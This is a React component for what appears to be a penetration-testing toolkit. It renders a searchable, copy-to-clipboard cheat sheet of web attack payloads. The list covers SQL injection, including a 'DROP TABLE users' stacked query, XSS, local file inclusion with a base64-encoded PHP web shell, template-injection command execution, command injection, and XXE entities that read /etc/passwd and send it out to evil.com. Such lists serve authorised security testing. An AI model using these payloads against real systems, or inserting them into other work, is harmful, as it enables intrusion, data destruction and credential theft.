import { useState } from 'react';
import { Copy, Check, ChevronDown, ChevronRight } from 'lucide-react';

interface PayloadCategory {
    id: string;
    name: string;
    payloads: { title: string; payload: string }[];
}

const payloadCategories: PayloadCategory[] = [
    {
        id: 'sqli',
        name: 'SQL Injection',
        payloads: [
            { title: 'Basic OR', payload: "' OR '1'='1" },
            { title: 'Basic OR (numeric)', payload: "1 OR 1=1" },
            { title: 'Comment bypass', payload: "' OR 1=1--" },
            { title: 'Comment bypass #', payload: "' OR 1=1#" },
            { title: 'Union Select', payload: "' UNION SELECT NULL--" },
            { title: 'Union Select (3 cols)', payload: "' UNION SELECT NULL,NULL,NULL--" },
            { title: 'Time-based blind', payload: "'; WAITFOR DELAY '0:0:5'--" },
            { title: 'Time-based blind (MySQL)', payload: "' AND SLEEP(5)--" },
            { title: 'Error-based (MySQL)', payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--" },
            { title: 'Stacked queries', payload: "'; DROP TABLE users--" },
        ],
    },
    {
        id: 'xss',
        name: 'XSS (Cross-Site Scripting)',
        payloads: [
            { title: 'Basic alert', payload: '<script>alert(1)</script>' },
            { title: 'IMG onerror', payload: '<img src=x onerror=alert(1)>' },
            { title: 'SVG onload', payload: '<svg onload=alert(1)>' },
            { title: 'Body onload', payload: '<body onload=alert(1)>' },
            { title: 'Event handler', payload: '<div onmouseover="alert(1)">hover me</div>' },
            { title: 'JavaScript URI', payload: 'javascript:alert(1)' },
            { title: 'Data URI', payload: 'data:text/html,<script>alert(1)</script>' },
            { title: 'Encoded', payload: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>' },
            { title: 'Template literal', payload: '${alert(1)}' },
            { title: 'Polyglot', payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//" },
        ],
    },
    {
        id: 'lfi',
        name: 'LFI (Local File Inclusion)',
        payloads: [
            { title: 'Basic traversal', payload: '../../../etc/passwd' },
            { title: 'Null byte', payload: '../../../etc/passwd%00' },
            { title: 'Double encoding', payload: '..%252f..%252f..%252fetc/passwd' },
            { title: 'Windows', payload: '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts' },
            { title: 'PHP wrapper', payload: 'php://filter/convert.base64-encode/resource=index.php' },
            { title: 'PHP input', payload: 'php://input' },
            { title: 'Data wrapper', payload: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+' },
            { title: 'Expect wrapper', payload: 'expect://id' },
            { title: 'Proc self', payload: '/proc/self/environ' },
            { title: 'Log poisoning', payload: '/var/log/apache2/access.log' },
        ],
    },
    {
        id: 'ssti',
        name: 'SSTI (Server-Side Template Injection)',
        payloads: [
            { title: 'Detection', payload: '{{7*7}}' },
            { title: 'Jinja2 detection', payload: '{{7*\'7\'}}' },
            { title: 'Twig detection', payload: '{{7*\'7\'}}' },
            { title: 'Jinja2 RCE', payload: "{{''.__class__.__mro__[2].__subclasses__()}}" },
            { title: 'Smarty', payload: '{php}echo `id`;{/php}' },
            { title: 'Freemarker', payload: '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }' },
            { title: 'Velocity', payload: '#set($str=$class.inspect("java.lang.String").type)' },
            { title: 'ERB (Ruby)', payload: '<%= system("id") %>' },
            { title: 'Pebble', payload: '{% set cmd = \'id\' %}' },
            { title: 'Mako', payload: '${self.module.cache.util.os.popen("id").read()}' },
        ],
    },
    {
        id: 'cmdi',
        name: 'Command Injection',
        payloads: [
            { title: 'Semicolon', payload: '; id' },
            { title: 'Pipe', payload: '| id' },
            { title: 'AND', payload: '&& id' },
            { title: 'OR', payload: '|| id' },
            { title: 'Backticks', payload: '`id`' },
            { title: 'Subshell', payload: '$(id)' },
            { title: 'Newline', payload: '%0a id' },
            { title: 'Windows', payload: '& whoami' },
            { title: 'Windows pipe', payload: '| whoami' },
            { title: 'Encoded newline', payload: '%0d%0a id' },
        ],
    },
    {
        id: 'xxe',
        name: 'XXE (XML External Entity)',
        payloads: [
            { title: 'Basic', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' },
            { title: 'SSRF', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.server/">]><foo>&xxe;</foo>' },
            { title: 'Blind (OOB)', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>' },
            { title: 'Parameter entity', payload: '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY blind SYSTEM "http://evil.com/?%xxe;">]>' },
        ],
    },
];

export default function Payloads() {
    const [expandedCategories, setExpandedCategories] = useState<string[]>(['sqli']);
    const [copied, setCopied] = useState<string | null>(null);
    const [searchQuery, setSearchQuery] = useState('');

    const toggleCategory = (categoryId: string) => {
        setExpandedCategories((prev) =>
            prev.includes(categoryId)
                ? prev.filter((id) => id !== categoryId)
                : [...prev, categoryId]
        );
    };

    const handleCopy = (payload: string, key: string) => {
        navigator.clipboard.writeText(payload);
        setCopied(key);
        setTimeout(() => setCopied(null), 2000);
    };

    const filteredCategories = payloadCategories.map((category) => ({
        ...category,
        payloads: category.payloads.filter(
            (p) =>
                p.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
                p.payload.toLowerCase().includes(searchQuery.toLowerCase())
        ),
    })).filter((category) => category.payloads.length > 0);

    return (
        <div className="space-y-3">
            {/* Search */}
            <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search payloads..."
                className="w-full px-3 py-2 text-sm bg-dark-800 border border-dark-600 rounded-md focus:outline-none focus:border-cyber-500"
            />

            {/* Categories */}
            <div className="space-y-2 max-h-[320px] overflow-y-auto">
                {filteredCategories.map((category) => (
                    <div key={category.id} className="border border-dark-700 rounded-md overflow-hidden">
                        {/* Category Header */}
                        <button
                            onClick={() => toggleCategory(category.id)}
                            className="w-full flex items-center justify-between px-3 py-2 bg-dark-800 hover:bg-dark-700 transition-colors"
                        >
                            <span className="text-sm font-medium text-cyber-400">{category.name}</span>
                            <div className="flex items-center gap-2">
                                <span className="text-xs text-gray-500">{category.payloads.length}</span>
                                {expandedCategories.includes(category.id) ? (
                                    <ChevronDown size={16} />
                                ) : (
                                    <ChevronRight size={16} />
                                )}
                            </div>
                        </button>

                        {/* Payloads */}
                        {expandedCategories.includes(category.id) && (
                            <div className="divide-y divide-dark-700">
                                {category.payloads.map((p, idx) => {
                                    const key = `${category.id}-${idx}`;
                                    return (
                                        <div
                                            key={key}
                                            className="flex items-center justify-between px-3 py-2 bg-dark-900 hover:bg-dark-800 transition-colors group"
                                        >
                                            <div className="flex-1 min-w-0">
                                                <p className="text-xs text-gray-400">{p.title}</p>
                                                <p className="text-xs font-mono text-gray-300 truncate">{p.payload}</p>
                                            </div>
                                            <button
                                                onClick={() => handleCopy(p.payload, key)}
                                                className="ml-2 p-1.5 bg-dark-700 hover:bg-dark-600 rounded opacity-0 group-hover:opacity-100 transition-all"
                                                title="Copy"
                                            >
                                                {copied === key ? (
                                                    <Check size={12} className="text-cyber-400" />
                                                ) : (
                                                    <Copy size={12} />
                                                )}
                                            </button>
                                        </div>
                                    );
                                })}
                            </div>
                        )}
                    </div>
                ))}
            </div>
        </div>
    );
}
